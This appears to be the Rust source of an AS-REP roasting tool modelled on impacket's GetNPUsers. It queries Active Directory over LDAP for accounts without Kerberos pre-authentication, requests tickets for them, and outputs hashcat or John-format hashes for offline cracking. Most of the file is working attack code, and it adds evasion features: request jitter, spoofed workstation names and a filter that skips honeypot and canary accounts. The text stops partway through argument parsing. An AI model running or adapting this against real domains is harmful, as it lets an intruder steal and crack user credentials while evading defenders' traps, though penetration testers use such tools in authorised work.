use anyhow::{anyhow, bail, Context, Result};
use chrono::{Duration as ChronoDuration, Utc};
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::net::{IpAddr, SocketAddr, ToSocketAddrs};
use std::path::Path;
use std::time::Duration;
use std::time::Duration as StdDuration;
use tracing::{debug, error, warn};
use zeroize::Zeroize;
use rand::{rngs::OsRng, Rng, RngCore};
use tokio::time::{sleep, timeout};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use ldap3::{Ldap, LdapConnAsync, LdapConnSettings, Scope, SearchEntry};
use std::path::PathBuf;




pub const ETYPE_RC4_HMAC: i32 = 23;
pub const ETYPE_AES128_CTS_HMAC_SHA1_96: i32 = 17;
pub const ETYPE_AES256_CTS_HMAC_SHA1_96: i32 = 18;

// Kerberos error codes
pub const KDC_ERR_C_PRINCIPAL_UNKNOWN: i64 = 6;
pub const KDC_ERR_PREAUTH_REQUIRED: i64 = 25;
pub const KDC_ERR_ETYPE_NOSUPP: i64 = 14;
pub const KDC_ERR_CLIENT_REVOKED: i64 = 18;

// PA-DATA types
const PA_PAC_REQUEST: i32 = 128;

// Application tags (RFC 4120 §5.10)
const TAG_AS_REQ: u8 = 10;
const TAG_AS_REP: u8 = 11;
const TAG_KRB_ERROR: u8 = 30;


pub const UF_ACCOUNTDISABLE: u32 = 0x0002;
pub const UF_DONT_REQUIRE_PREAUTH: u32 = 0x0040_0000;



#[tokio::main(flavor = "multi_thread", worker_threads = 2)]
async fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();

    if argv.is_empty() || argv.iter().any(|a| a == "-h" || a == "--help" || a == "-help") {
        print_banner();
        println!("{}", usage());
        std::process::exit(if argv.is_empty() { 1 } else { 0 });
    }

    print_banner();

    if let Err(e) = run(argv).await {
        eprintln!("[-] {:#}", e);
        std::process::exit(1);
    }
}

async fn run(argv: Vec<String>) -> Result<()> {
    let cli = parse_args(&argv)?;

    init_logging(cli.debug);

    if cli.jitter_min > cli.jitter_max {
        bail!("-jitter-min ({}) > -jitter-max ({})", cli.jitter_min, cli.jitter_max);
    }

    // Parse positional target: [[domain/]username[:password]]
    let target_str = cli.target.as_deref()
        .ok_or_else(|| anyhow!("the following arguments are required: target"))?;
    let t = parse_target(target_str);

    let domain_upper = t.domain.to_uppercase();

    let kdc_target = cli.dc_ip.clone()
        .or_else(|| cli.dc_host.clone())
        .unwrap_or_else(|| t.domain.clone());
    let kdc_addr = resolve_kdc(&kdc_target).context("resolving KDC")?;

    let workstation = cli.workstation.clone().unwrap_or_else(random_workstation);
    debug!("auxiliary workstation: {}", workstation);

    // -usersfile (no credentials needed)
    if let Some(uf) = cli.users_file.as_ref() {
        let users = read_users_file(uf)?;
        println!("[*] Loaded {} users from file", users.len());
        roast_user_list(&cli, &users, kdc_addr, &domain_upper).await?;
        return Ok(());
    }

    //single user with -no-pass
    if cli.no_pass {
        let user = t.username.clone()
            .ok_or_else(|| anyhow!(
                "-no-pass requires a username in target (e.g. contoso.com/john.doe -no-pass)"
            ))?;
        roast_user_list(&cli, &[user], kdc_addr, &domain_upper).await?;
        return Ok(());
    }

    // LDAP enumeration — need credentials
    let username = t.username.clone()
        .ok_or_else(|| anyhow!(
            "Username required in target for LDAP mode (e.g. contoso.com/emily[:password])"
        ))?;

    let mut password = match t.password.clone() {
        Some(p) => p,
        None => rpassword::prompt_password(format!("Password for {}@{}: ", username, t.domain))
            .context("reading password")?,
    };

    let ldap_target = cli.dc_host.clone()
        .or_else(|| cli.dc_ip.clone())
        .unwrap_or_else(|| t.domain.clone());

    let users = match enumerate_no_preauth(
        &ldap_target, &t.domain, &username, &password, true, cli.timeout,
    ).await {
        Ok(u) => u,
        Err(e) => {
            warn!("LDAPS failed ({e}), falling back to plain LDAP");
            enumerate_no_preauth(
                &ldap_target, &t.domain, &username, &password, false, cli.timeout,
            ).await?
        }
    };

    password.zeroize();

    if users.is_empty() {
        println!("[-] No accounts found with DONT_REQUIRE_PREAUTH");
        return Ok(());
    }

    print_table(&users);

    if !cli.request {
        println!("[!] Exec with -request to obtain TGTs");
        return Ok(());
    }

    //  request TGTs
    let targets: Vec<String> = users
        .iter()
        .filter(|u| {
            if cli.skip_honeypots
                && looks_like_honeypot(&u.sam_account_name, u.pwd_last_set, u.last_logon)
            {
                warn!("Skipping '{}' (honeypot heuristic)", u.sam_account_name);
                false
            } else {
                true
            }
        })
        .map(|u| u.sam_account_name.clone())
        .collect();

    println!("[+] Requesting AS-REP for {} account(s)", targets.len());
    roast_user_list(&cli, &targets, kdc_addr, &domain_upper).await?;

    Ok(())
}

fn init_logging(debug: bool) {
    let filter = if debug { "debug" } else { "info" };
    let _ = tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::new(filter))
        .with_target(false)
        .without_time()
        .try_init();
}

fn resolve_kdc(host: &str) -> Result<SocketAddr> {
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Ok(SocketAddr::new(ip, 88));
    }
    let mut addrs = format!("{host}:88")
        .to_socket_addrs()
        .with_context(|| format!("resolviendo {host}"))?;
    addrs
        .next()
        .ok_or_else(|| anyhow!("DNS sin respuesta para {host}"))
}

fn read_users_file(path: &Path) -> Result<Vec<String>> {
    let f = File::open(path).with_context(|| format!("abriendo {}", path.display()))?;
    Ok(BufReader::new(f)
        .lines()
        .map_while(Result::ok)
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect())
}

async fn roast_user_list(
    cli: &Cli,
    users: &[String],
    kdc: SocketAddr,
    domain_upper: &str,
) -> Result<()> {
    let mut out_file: Option<File> = match cli.output.as_ref() {
        Some(p) => Some(File::create(p).with_context(|| format!("creando {}", p.display()))?),
        None => None,
    };

    let total = users.len();
    let mut _roastable = 0usize;
    let mut _unknown = 0usize;
    let mut _preauth = 0usize;


    for (idx, user) in users.iter().enumerate() {
        if idx > 0 {
            jitter_sleep(cli.jitter_min, cli.jitter_max).await;
        }

        debug!("[{}/{}] AS-REQ para '{}'", idx + 1, total, user);

        let result = send_as_req(
            kdc,
            user,
            domain_upper,
            &cli.etype,
            cli.request_pac,
            cli.timeout,
        )
        .await;

        match result {
            Ok(AsRepResult::Roastable { etype, cipher }) => {
                
                let hash = format_hash(user, domain_upper, etype, &cipher, &cli.format)?;
                println!("{hash}");
                if let Some(f) = out_file.as_mut() {
                    writeln!(f, "{hash}")?;
                }
            }
            Ok(AsRepResult::PreAuthRequired) => {
                _preauth += 1;
                println!("[-] '{user}': exists but requires pre-auth (not roastable)");
            }
            Ok(AsRepResult::UserUnknown) => {
                _unknown += 1;
                println!("[-] '{user}': user does not exist in the domain");
            }
            Ok(AsRepResult::Revoked) => {
                println!("[-] '{user}': account disabled or locked");
            }
            Ok(AsRepResult::EtypeNotSupported) => {
                warn!(
                    "'{user}': KDC no soporta etypes pedidos. Prueba --etype aes-then-rc4 \
                     o --etype rc4-only"
                );
            }
            Ok(AsRepResult::Other { code, text }) => {
                warn!(
                    "'{user}': KRB error {code} ({}){}",
                    krb_error_name(code),
                    if text.is_empty() { String::new() } else { format!(": {text}") }
                );
            }
            Err(e) => {
                error!("'{user}': fallo de red/protocolo: {e}");
                jitter_sleep(cli.jitter_max, cli.jitter_max * 2).await;
            }
        }
    }

    if let Some(mut f) = out_file {
        f.flush().ok();
    }

    
    Ok(())
}

/// Kerberos Error Codes.
fn krb_error_name(code: i64) -> &'static str {
    match code {
        0 => "KDC_ERR_NONE",
        1 => "KDC_ERR_NAME_EXP",
        2 => "KDC_ERR_SERVICE_EXP",
        3 => "KDC_ERR_BAD_PVNO",
        4 => "KDC_ERR_C_OLD_MAST_KVNO",
        5 => "KDC_ERR_S_OLD_MAST_KVNO",
        6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN",
        7 => "KDC_ERR_S_PRINCIPAL_UNKNOWN",
        8 => "KDC_ERR_PRINCIPAL_NOT_UNIQUE",
        9 => "KDC_ERR_NULL_KEY",
        10 => "KDC_ERR_CANNOT_POSTDATE",
        11 => "KDC_ERR_NEVER_VALID",
        12 => "KDC_ERR_POLICY",
        13 => "KDC_ERR_BADOPTION",
        14 => "KDC_ERR_ETYPE_NOSUPP",
        15 => "KDC_ERR_SUMTYPE_NOSUPP",
        16 => "KDC_ERR_PADATA_TYPE_NOSUPP",
        17 => "KDC_ERR_TRTYPE_NOSUPP",
        18 => "KDC_ERR_CLIENT_REVOKED",
        19 => "KDC_ERR_SERVICE_REVOKED",
        20 => "KDC_ERR_TGT_REVOKED",
        21 => "KDC_ERR_CLIENT_NOTYET",
        22 => "KDC_ERR_SERVICE_NOTYET",
        23 => "KDC_ERR_KEY_EXPIRED",
        24 => "KDC_ERR_PREAUTH_FAILED",
        25 => "KDC_ERR_PREAUTH_REQUIRED",
        26 => "KDC_ERR_SERVER_NOMATCH",
        27 => "KDC_ERR_MUST_USE_USER2USER",
        28 => "KDC_ERR_PATH_NOT_ACCEPTED",
        29 => "KDC_ERR_SVC_UNAVAILABLE",
        60 => "KRB_ERR_GENERIC",
        61 => "KRB_ERR_FIELD_TOOLONG",
        _ => "UNKNOWN",
    }
}

fn print_table(users: &[PreAuthDisabledUser]) {
    println!(
        "{:<25} {:<40} {:<22} {:<22} {:<10}",
        "sAMAccountName", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"
    );
    println!("{}", "-".repeat(125));
    for u in users {
        let pls = if u.pwd_last_set == 0 {
            "<never>".to_string()
        } else {
            chrono::DateTime::<chrono::Utc>::from_timestamp(filetime_to_unix(u.pwd_last_set), 0)
                .map(|d| d.format("%Y-%m-%d %H:%M:%S").to_string())
                .unwrap_or_else(|| "<invalid>".into())
        };
        let llg = if u.last_logon == 0 {
            "<never>".to_string()
        } else {
            chrono::DateTime::<chrono::Utc>::from_timestamp(filetime_to_unix(u.last_logon), 0)
                .map(|d| d.format("%Y-%m-%d %H:%M:%S").to_string())
                .unwrap_or_else(|| "<invalid>".into())
        };
        let mof = if u.member_of.len() > 38 {
            format!("{}...", &u.member_of[..35])
        } else {
            u.member_of.clone()
        };
        println!(
            "{:<25} {:<40} {:<22} {:<22} 0x{:x}",
            u.sam_account_name, mof, pls, llg, u.user_account_control
        );
    }
    println!();
}

/// Random Jitter between requests with CSPRNG.
pub async fn jitter_sleep(min_secs: u64, max_secs: u64) {
    if max_secs == 0 {
        return;
    }
    let mut rng = OsRng;
    let lo = min_secs.min(max_secs);
    let hi = min_secs.max(max_secs).max(1);
    let secs = rng.gen_range(lo..=hi);
    let extra_ms: u64 = rng.gen_range(0..1000);
    sleep(Duration::from_millis(secs * 1000 + extra_ms)).await;
}


pub fn secure_nonce() -> u32 {
    let mut buf = [0u8; 4];
    OsRng.fill_bytes(&mut buf);
    u32::from_be_bytes(buf) & 0x7FFF_FFFF
}


pub fn random_workstation() -> String {
    let mut rng = OsRng;
    let patterns: [&str; 4] = ["DESKTOP-", "LAPTOP-", "WS-", "PC-"];
    let prefix = patterns[rng.gen_range(0..patterns.len())];
    let charset: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZ0123456789";
    let len = rng.gen_range(7..=8);
    let suffix: String = (0..len)
        .map(|_| charset[rng.gen_range(0..charset.len())] as char)
        .collect();
    format!("{prefix}{suffix}")
}


pub fn looks_like_honeypot(sam: &str, pwd_last_set: u64, last_logon: u64) -> bool {
    let lower = sam.to_lowercase();
    let bait = [
        "honey", "honeypot", "decoy", "canary", "trap", "bait", "lure",
        "krbtgt_", "test_admin", "fakeadmin",
    ];
    if bait.iter().any(|k| lower.contains(k)) {
        return true;
    }
    if pwd_last_set == 0 && last_logon == 0 {
        return true;
    }
    false
}

pub fn filetime_to_unix(ft: u64) -> i64 {
    if ft == 0 {
        return 0;
    }
    ((ft as i128 - 116_444_736_000_000_000) / 10_000_000) as i64
}



#[derive(Debug, Clone)]
pub struct PreAuthDisabledUser {
    pub sam_account_name: String,
    pub member_of: String,
    pub pwd_last_set: u64,
    pub last_logon: u64,
    pub user_account_control: u32,
}

pub fn domain_to_base_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",")
}

pub async fn enumerate_no_preauth(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    use_ldaps: bool,
    timeout_secs: u64,
) -> Result<Vec<PreAuthDisabledUser>> {
    let scheme = if use_ldaps { "ldaps" } else { "ldap" };
    let port = if use_ldaps { 636 } else { 389 };
    let url = format!("{scheme}://{target}:{port}");

    let settings = LdapConnSettings::new()
        .set_conn_timeout(Duration::from_secs(timeout_secs))
        .set_no_tls_verify(false);

    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
        .await
        .with_context(|| format!("conectando a LDAP {url}"))?;

    // ldap3 async requires a task to drive the socket; without it the futures for
    // bind/search hang. The drive! macro does exactly that (spawns a tokio task).
    ldap3::drive!(conn);

    let upn = if username.contains('@') {
        username.to_string()
    } else {
        format!("{username}@{domain}")
    };

    ldap.simple_bind(&upn, password)
        .await
        .context("LDAP bind falló")?
        .success()
        .context("LDAP bind: credenciales rechazadas")?;

    let users = run_search(&mut ldap, domain).await?;

    let _ = ldap.unbind().await;
    Ok(users)
}

async fn run_search(ldap: &mut Ldap, domain: &str) -> Result<Vec<PreAuthDisabledUser>> {
    let base_dn = domain_to_base_dn(domain);
    let filter = format!(
        "(&(UserAccountControl:1.2.840.113556.1.4.803:={})\
          (!(UserAccountControl:1.2.840.113556.1.4.803:={}))\
          (!(objectCategory=computer)))",
        UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE
    );

    let attrs = vec![
        "sAMAccountName",
        "pwdLastSet",
        "memberOf",
        "userAccountControl",
        "lastLogon",
    ];

    let (rs, _res) = ldap
        .search(&base_dn, Scope::Subtree, &filter, attrs)
        .await
        .context("LDAP search falló")?
        .success()
        .context("LDAP search devolvió error")?;

    let mut out = Vec::with_capacity(rs.len());
    for entry in rs {
        let se = SearchEntry::construct(entry);
        let sam = first_attr(&se, "sAMAccountName").unwrap_or_default();
        if sam.is_empty() {
            continue;
        }
        let uac = first_attr(&se, "userAccountControl")
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(0);
        let pwd = first_attr(&se, "pwdLastSet")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(0);
        let last = first_attr(&se, "lastLogon")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(0);
        let memof = first_attr(&se, "memberOf").unwrap_or_default();

        out.push(PreAuthDisabledUser {
            sam_account_name: sam,
            member_of: memof,
            pwd_last_set: pwd,
            last_logon: last,
            user_account_control: uac,
        });
    }
    Ok(out)
}

fn first_attr(se: &SearchEntry, name: &str) -> Option<String> {
    se.attrs.get(name).and_then(|v| v.first().cloned())
}




#[derive(Debug)]
pub enum AsRepResult {
    Roastable { etype: i32, cipher: Vec<u8> },
    PreAuthRequired,
    UserUnknown,
    Revoked,
    EtypeNotSupported,
    Other { code: i64, text: String },
}

fn etype_list(pref: &EtypePref) -> Vec<i32> {
    match pref {
        EtypePref::AesOnly => vec![ETYPE_AES256_CTS_HMAC_SHA1_96, ETYPE_AES128_CTS_HMAC_SHA1_96],
        EtypePref::AesThenRc4 => vec![
            ETYPE_AES256_CTS_HMAC_SHA1_96,
            ETYPE_AES128_CTS_HMAC_SHA1_96,
            ETYPE_RC4_HMAC,
        ],
        EtypePref::Rc4Only => vec![ETYPE_RC4_HMAC],
    }
}



fn build_principal_name(name_type: i32, components: &[&str]) -> Vec<u8> {
    let nt = enc_explicit(0, &enc_integer(name_type as i64));
    let strings: Vec<Vec<u8>> = components.iter().map(|s| enc_general_string(s)).collect();
    let ns_seq = enc_sequence_of(&strings);
    let ns = enc_explicit(1, &ns_seq);
    enc_sequence(&[nt, ns].concat())
}

fn build_kdc_options() -> Vec<u8> {
    let bytes = 0u32.to_be_bytes();
    enc_bit_string(&bytes, 0)
}

fn build_pa_pac_request(include: bool) -> Vec<u8> {
   
    let bool_val = enc_tlv(0x01, &[if include { 0xFF } else { 0x00 }]);
    let inner = enc_explicit(0, &bool_val);
    enc_sequence(&inner)
}

fn build_pa_data(padata_type: i32, padata_value: &[u8]) -> Vec<u8> {
    let pt = enc_explicit(1, &enc_integer(padata_type as i64));
    let pv = enc_explicit(2, &enc_octet_string(padata_value));
    enc_sequence(&[pt, pv].concat())
}

fn build_kdc_req_body(
    username: &str,
    domain_upper: &str,
    etypes: &[i32],
) -> Vec<u8> {
    let kdc_options_field = enc_explicit(0, &build_kdc_options());
    let cname = enc_explicit(1, &build_principal_name(1, &[username]));
    let realm = enc_explicit(2, &enc_general_string(domain_upper));
    let sname = enc_explicit(3, &build_principal_name(2, &["krbtgt", domain_upper]));
    let now = Utc::now();
    let till_time = now + ChronoDuration::hours(8);
    let till = enc_explicit(5, &enc_generalized_time(till_time));
    let rtime = enc_explicit(6, &enc_generalized_time(till_time));
    let nonce = enc_explicit(7, &enc_uint(secure_nonce() as u64));
    let etype_items: Vec<Vec<u8>> = etypes.iter().map(|&e| enc_integer(e as i64)).collect();
    let etype = enc_explicit(8, &enc_sequence_of(&etype_items));

    let mut body = Vec::new();
    body.extend(kdc_options_field);
    body.extend(cname);
    body.extend(realm);
    body.extend(sname);
    body.extend(till);
    body.extend(rtime);
    body.extend(nonce);
    body.extend(etype);

    enc_sequence(&body)
}


pub fn build_as_req(
    username: &str,
    domain_upper: &str,
    etypes: &[i32],
    request_pac: bool,
) -> Vec<u8> {

    let pvno = enc_explicit(1, &enc_uint(5));
    let msg_type = enc_explicit(2, &enc_uint(10));
    let padata_field: Vec<u8> = if request_pac {
        let pa = build_pa_data(PA_PAC_REQUEST, &build_pa_pac_request(true));
        enc_explicit(3, &enc_sequence_of(&[pa]))
    } else {
        Vec::new()
    };
    let req_body = enc_explicit(4, &build_kdc_req_body(username, domain_upper, etypes));

    // KDC-REQ ::= SEQUENCE { ... }
    let mut kdc_req_inner = Vec::new();
    kdc_req_inner.extend(pvno);
    kdc_req_inner.extend(msg_type);
    kdc_req_inner.extend(padata_field);
    kdc_req_inner.extend(req_body);
    let kdc_req = enc_sequence(&kdc_req_inner);

    // [APPLICATION 10] KDC-REQ
    enc_tlv(app_tag(TAG_AS_REQ), &kdc_req)
}



pub async fn send_as_req(
    kdc: SocketAddr,
    username: &str,
    domain_upper: &str,
    etype_pref: &EtypePref,
    request_pac: bool,
    timeout_secs: u64,
) -> Result<AsRepResult> {
    let etypes = etype_list(etype_pref);
    let mut msg = build_as_req(username, domain_upper, &etypes, request_pac);

    let response = match timeout(StdDuration::from_secs(timeout_secs), send_recv_tcp(kdc, &msg))
        .await
    {
        Ok(r) => r?,
        Err(_) => bail!("timeout esperando respuesta del KDC {kdc}"),
    };

    msg.zeroize();
    parse_kdc_response(&response)
}

async fn send_recv_tcp(addr: SocketAddr, msg: &[u8]) -> Result<Vec<u8>> {
    let mut stream = TcpStream::connect(addr).await?;
    let len = (msg.len() as u32).to_be_bytes();
    stream.write_all(&len).await?;
    stream.write_all(msg).await?;
    stream.flush().await?;

    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len > 1024 * 1024 {
        bail!("respuesta del KDC sospechosamente grande: {resp_len} bytes");
    }
    let mut buf = vec![0u8; resp_len];
    stream.read_exact(&mut buf).await?;
    let _ = stream.shutdown().await;
    Ok(buf)
}




fn parse_kdc_response(data: &[u8]) -> Result<AsRepResult> {
    if data.is_empty() {
        bail!("respuesta del KDC vacía");
    }
    let cur = DerCursor::new(data);
    let (tag, payload, _) = cur.next_tlv()?;
    let app_n = tag & 0x1F;
    if (tag & 0xE0) != 0x60 {
        bail!("tag inesperado en respuesta KDC: 0x{:02x}", tag);
    }
    match app_n {
        TAG_AS_REP => parse_as_rep(payload),
        TAG_KRB_ERROR => parse_krb_error(payload),
        n => bail!("app tag desconocido en respuesta: {}", n),
    }
}

fn parse_as_rep(payload: &[u8]) -> Result<AsRepResult> {
    let (seq_tag, seq_payload, _) = DerCursor::new(payload).next_tlv()?;
    if seq_tag != 0x30 {
        bail!("AS-REP: esperaba SEQUENCE, encontré 0x{:02x}", seq_tag);
    }
    let seq = DerCursor::new(seq_payload);
    // [6] enc-part
    let enc_part_payload = seq
        .find_tag(ctx_tag(6))
        .ok_or_else(|| anyhow!("AS-REP: falta enc-part"))?;
    let (enc_seq_tag, enc_seq, _) = DerCursor::new(enc_part_payload).next_tlv()?;
    if enc_seq_tag != 0x30 {
        bail!("EncryptedData: esperaba SEQUENCE, encontré 0x{:02x}", enc_seq_tag);
    }
    let enc_cur = DerCursor::new(enc_seq);

    // [0] etype
    let etype_payload = enc_cur
        .find_tag(ctx_tag(0))
        .ok_or_else(|| anyhow!("EncryptedData: falta etype"))?;
    let (et_tag, et_inner) = unwrap_inner(etype_payload)?;
    if et_tag != 0x02 {
        bail!("etype: esperaba INTEGER");
    }
    let etype = decode_integer(et_inner)? as i32;

    // [2] cipher
    let cipher_payload = enc_cur
        .find_tag(ctx_tag(2))
        .ok_or_else(|| anyhow!("EncryptedData: falta cipher"))?;
    let (c_tag, c_inner) = unwrap_inner(cipher_payload)?;
    if c_tag != 0x04 {
        bail!("cipher: esperaba OCTET STRING");
    }

    Ok(AsRepResult::Roastable {
        etype,
        cipher: c_inner.to_vec(),
    })
}

/// KRB-ERROR ::= [APPLICATION 30] SEQUENCE {
///     pvno        [0] INTEGER (5),
///     msg-type    [1] INTEGER (30),
///     ctime       [2] KerberosTime OPTIONAL,
///     cusec       [3] Microseconds OPTIONAL,
///     stime       [4] KerberosTime,
///     susec       [5] Microseconds,
///     error-code  [6] Int32,
///     ...
///     e-text      [11] KerberosString OPTIONAL,
///     e-data      [12] OCTET STRING OPTIONAL
/// }
fn parse_krb_error(payload: &[u8]) -> Result<AsRepResult> {
    let (seq_tag, seq_payload, _) = DerCursor::new(payload).next_tlv()?;
    if seq_tag != 0x30 {
        bail!("KRB-ERROR: esperaba SEQUENCE, encontré 0x{:02x}", seq_tag);
    }
    let seq = DerCursor::new(seq_payload);

    let ec_payload = seq
        .find_tag(ctx_tag(6))
        .ok_or_else(|| anyhow!("KRB-ERROR: falta error-code"))?;
    let (ec_tag, ec_inner) = unwrap_inner(ec_payload)?;
    if ec_tag != 0x02 {
        bail!("error-code: esperaba INTEGER");
    }
    let code = decode_integer(ec_inner)?;

    let etext = seq
        .find_tag(ctx_tag(11))
        .and_then(|p| unwrap_inner(p).ok())
        .and_then(|(t, inner)| {
            if t == 0x1B || t == 0x1A {
                String::from_utf8(inner.to_vec()).ok()
            } else {
                None
            }
        })
        .unwrap_or_default();

    Ok(match code {
        KDC_ERR_PREAUTH_REQUIRED => AsRepResult::PreAuthRequired,
        KDC_ERR_C_PRINCIPAL_UNKNOWN => AsRepResult::UserUnknown,
        KDC_ERR_CLIENT_REVOKED => AsRepResult::Revoked,
        KDC_ERR_ETYPE_NOSUPP => AsRepResult::EtypeNotSupported,
        _ => AsRepResult::Other { code, text: etext },
    })
}


pub fn format_hash(
    username: &str,
    domain_upper: &str,
    etype: i32,
    cipher: &[u8],
    fmt: &HashFormat,
) -> Result<String> {
    if cipher.len() < 16 {
        bail!("cipher demasiado corto ({} bytes)", cipher.len());
    }
    Ok(match (etype, fmt) {
        (17 | 18, HashFormat::Hashcat) => {
            let split = cipher.len() - 12;
            format!(
                "$krb5asrep${}${}@{}:{}${}",
                etype,
                username,
                domain_upper,
                hex::encode(&cipher[split..]),
                hex::encode(&cipher[..split])
            )
        }
        (17 | 18, HashFormat::John) => {
            let split = cipher.len() - 12;
            format!(
                "$krb5asrep${}${}{}${}${}",
                etype,
                domain_upper,
                username,
                hex::encode(&cipher[..split]),
                hex::encode(&cipher[split..])
            )
        }
        (_, HashFormat::Hashcat) => format!(
            "$krb5asrep${}${}@{}:{}${}",
            etype,
            username,
            domain_upper,
            hex::encode(&cipher[..16]),
            hex::encode(&cipher[16..])
        ),
        (_, HashFormat::John) => format!(
            "$krb5asrep${}@{}:{}${}",
            username,
            domain_upper,
            hex::encode(&cipher[..16]),
            hex::encode(&cipher[16..])
        ),
    })
}




#[derive(Clone, Debug, Default, PartialEq)]
pub enum HashFormat {
    #[default]
    Hashcat,
    John,
}

impl HashFormat {
    fn from_str(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "hashcat" => Ok(Self::Hashcat),
            "john"    => Ok(Self::John),
            other     => bail!("invalid -format value '{other}': must be hashcat or john"),
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq)]
pub enum EtypePref {
    #[default]
    AesOnly,
    AesThenRc4,
    Rc4Only,
}

impl EtypePref {
    fn from_str(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "aes-only" | "aesonly"       => Ok(Self::AesOnly),
            "aes-then-rc4" | "aesthenrc4" => Ok(Self::AesThenRc4),
            "rc4-only" | "rc4only"       => Ok(Self::Rc4Only),
            other => bail!("invalid -etype value '{other}': must be aes-only, aes-then-rc4, or rc4-only"),
        }
    }
}


#[derive(Debug, Default)]
pub struct Cli {
    pub target: Option<String>,   // [[domain/]username[:password]]

    pub request:        bool,
    pub output:         Option<PathBuf>,
    pub format:         HashFormat,
    pub users_file:     Option<PathBuf>,
    pub ts:             bool,
    pub debug:          bool,

    pub hashes:         Option<String>,
    pub no_pass:        bool,
    pub kerberos:       bool,
    pub aes_key:        Option<String>,

    pub dc_ip:          Option<String>,
    pub dc_host:        Option<String>,

    pub etype:          EtypePref,
    pub jitter_min:     u64,
    pub jitter_max:     u64,
    pub timeout:        u64,
    pub skip_honeypots: bool,
    pub request_pac:    bool,
    pub workstation:    Option<String>,
}

fn print_banner() {
    eprintln!("  GetNPUsers — Rust  | Inspired by impacket GetNPUsers.py\n");
}

fn usage() -> &'static str {
    r#"usage: GetNPUsers [-h] [-request] [-outputfile OUTPUTFILE]
                  [-format {hashcat,john}] [-usersfile USERSFILE]
                  [-ts] [-debug]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                  [-dc-ip ip address] [-dc-host hostname]
                  target

Queries target domain for users with 'Do not require Kerberos preauthentication'
set and export their TGTs for cracking.

positional arguments:
  target                [[domain/]username[:password]]

options:
  -h, -help             show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat
                        format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        Format to save the AS_REQ of users without
                        pre-authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
  -aesKey hex key       AES key to use for Kerberos Authentication
                        (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        uses the domain part (FQDN) specified in target
  -dc-host hostname     Hostname of the domain controller to use. If omitted,
                        the domain part (FQDN) specified in target will be used

examples:
  GetNPUsers contoso.com/john.doe -no-pass
  GetNPUsers contoso.com/emily:password -request
  GetNPUsers contoso.com/emily:password -request -outputfile hashes.txt
  GetNPUsers -no-pass -usersfile users.txt contoso.com/"#
}

fn parse_args(argv: &[String]) -> Result<Cli> {
    let mut cli = Cli {
        format:         HashFormat::Hashcat,
        etype:          EtypePref::AesOnly,
        jitter_min:     2,
        jitter_max:     7,
        timeout:        5,
        skip_honeypots: true,
        ..Cli::default()
    };

    let mut i = 0;

    macro_rules! next_val {
        ($flag:expr) => {{
            i += 1;
            argv.get(i)
                .ok_or_else(|| anyhow!("argument {} requires a value", $flag))?
                .clone()
        }};
    }

    while i < argv.len() {
        let tok = &argv[i];
        // Accept both -flag and --flag
        let flag = tok.trim_start_matches('-');

        match flag {
            "h" | "help" => {
                print_banner();
                println!("{}", usage());
                std::process::exit(0);
            }
            "request"     => cli.request     = true,
            "outputfile"  => cli.output       = Some(PathBuf::from(next_val!("-outputfile"))),
            "format"      => cli.format       = HashFormat::from_str(&next_val!("-format"))?,
            "usersfile"   => cli.users_file   = Some(PathBuf::from(next_val!("-usersfile"))),
            "ts"          => cli.ts           = true,
            "debug"       => cli.debug        = true,
            "hashes"      => cli.hashes       = Some(next_val!("-hashes")),
            "no-pass"     => cli.no_pass      = true,
            "k"           => cli.kerberos     = true,
            "aesKey" | "aes-key" | "aeskey"
                          => cli.aes_key      = Some(next_val!("-aesKey")),
            "dc-ip"       => cli.dc_ip        = Some(next_val!("-dc-ip")),
            "dc-host"     => cli.dc_host      = Some(next_val!("-dc-host")),
            "etype"       => cli.etype        = EtypePref::from_str(&next_val!("-etype"))?,
            "jitter-min"  => cli.jitter_min   = next_val!("-jitter-min").parse()?,
            "jitter-max"  => cli.jitter_max   = next_val!("-jitter-max").parse()?,
            "timeout"     => cli.timeout      = next_val!("-timeout").parse()?,
            "no-honeypot-skip" => cli.skip_honeypots = false,
            "request-pac" => cli.request_pac  = true,
            "workstation" => cli.workstation  = Some(next_val!("-workstation")),
            _ if !tok.starts_with('-') => {
                if cli.target.is_none() {
                    cli.target = Some(tok.clone());
                } else {
                    bail!("Unexpected positional argument: {tok}");
                }
            }
            _ => bail!("Unknown flag: {tok}  (try -h for help)"),
        }

        i += 1;
    }

    Ok(cli)
}


struct ParsedTarget {
    domain:   String,
    username: Option<String>,
    password: Option<String>,
}

fn parse_target(s: &str) -> ParsedTarget {
    if let Some(slash) = s.find('/') {
        let domain = s[..slash].to_string();
        let rest   = &s[slash + 1..];
        if rest.is_empty() {
            return ParsedTarget { domain, username: None, password: None };
        }
